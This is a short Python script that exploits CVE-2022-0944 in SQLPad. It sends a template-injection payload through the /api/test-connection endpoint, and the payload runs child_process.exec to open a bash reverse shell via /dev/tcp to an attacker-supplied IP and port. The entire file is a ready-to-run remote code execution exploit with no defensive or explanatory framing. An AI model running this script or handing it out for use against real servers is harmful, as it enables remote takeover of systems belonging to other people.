import argparse
import requests

def main():
   
    parser = argparse.ArgumentParser(description="CVE-2022-0944 RCE Exploit")
    parser.add_argument('root_url', help="Root URL of the SQLPad application")
    parser.add_argument('attacker_ip', help="attacker ip")
    parser.add_argument('attacker_port', help="attacker port")
    
    args = parser.parse_args()

    target_url = f"{args.root_url}/api/test-connection"

    payload = f"{{{{ process.mainModule.require('child_process').exec('/bin/bash -c \"bash -i >& /dev/tcp/{args.attacker_ip}/{args.attacker_port} 0>&1\"') }}}}"

    headers = {
        'Content-Type': 'application/json',
        'Accept': 'application/json'
    }

    #POST data (JSON body of the request)
    data = {
        "name": "test",
        "driver": "mysql",
        "data": {
            "database": payload
        },
        "database": payload
    }

    try:
        response = requests.post(target_url, headers=headers, json=data)
       
        print(f"Response status code: {response.status_code}")
        print(f"Response body: {response.text}")

        if response.status_code == 200:
            print(f"Exploit sent successfully. Check your listener on {args.attacker_ip}:{args.attacker_port}")
        else:
            print(f"Exploit sent, but server responded with status code: {response.status_code}. Check your listener.")
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    main()
